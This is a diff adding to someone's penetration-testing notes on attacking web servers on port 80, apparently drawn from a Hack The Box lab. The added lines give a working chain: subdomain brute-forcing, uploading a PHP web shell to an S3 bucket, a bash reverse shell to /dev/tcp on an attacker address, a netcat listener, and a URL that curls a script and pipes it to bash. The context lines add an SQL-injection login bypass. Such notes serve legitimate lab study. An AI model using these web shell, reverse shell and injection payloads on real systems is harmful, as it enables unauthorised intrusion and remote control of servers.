@@ -22,6 +22,31 @@ PORT 80 - HTTP
     dir busting attack looking for php and html pages as these are most common
         login.php can be brute forced or use credentials downloaded from ftp ect..
 
+    gobuster vhost -w subdomains-top1million-5000.txt -u http://domain.htb --append-domain
+        this can be used to find subdomains of sites, ie: s3.thetoppers.htb
+        sites like this may need to be associated to their server ip using the following
+            echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+        s3 subdomains are AWS related and could be interacted with using the awscli with the following:
+            aws --endpoint=http://s3.domain.htb s3 ls
+            aws --endpoint=http://s3.domain.htb s3 ls s3://thetoppers.htb
+                if this shows a .php file we can create a php one liner and use aws to upload
+                    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+                then upload with aws using the following: 
+                aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+            going to the site http://thetoppers.htb/shell.php?cmd=id we can see the upload worked and we can reverse shell in
+                create shell.php with the following:
+                    #!/bin/bash
+                    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+                start netcat listening on port 1337
+                    nc -nvlp 1337
+                start a python webserver on port 8000 to host the bash file
+                    python3 -m http.server 8000
+                execute the reverse shell with the following in the web browser:
+                    http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
+                got stuck here
+                    bash: cannot set terminal process group (1561): Inappropriate ioctl for device
+                    bash: no job control in this shell
+
     when a page has a login page can attempt SQL Injection using
         Username = admin'#
         Password = abc123 or anything
